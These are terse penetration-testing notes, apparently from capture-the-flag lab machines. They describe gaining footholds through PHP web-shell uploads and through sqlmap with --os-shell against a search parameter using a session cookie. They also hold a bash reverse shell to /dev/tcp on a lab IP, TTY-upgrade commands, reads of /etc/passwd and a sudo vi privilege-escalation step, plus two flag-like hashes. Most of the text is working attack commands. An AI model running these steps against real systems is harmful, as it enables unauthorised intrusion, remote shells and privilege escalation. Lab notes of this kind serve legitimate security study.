Foothold:
PHP
~~reverse shells
https://github.com/BlackArch/webshells
/usr/share/webshells/
upload file & look for uploads directory
python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data user: 
lookup for a files and try to login as user
/var/www/html/...

cat /etc/passwd <- check users on server
su USER <- relogin

ec9b13ca4d6229cd5cc1e09980965bf7
dd6e058e814260bc70e9bbdef2715849
Foothold:
SQL
sqlmap -u 'http://10.129.241.156/dashboard.php?search=any+query' --cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell
bash -c "bash -i >& /dev/tcp/10.10.14.116/1234 0>&1"
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo
fg
export TERM=xterm
/var/www/data checkout
 sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
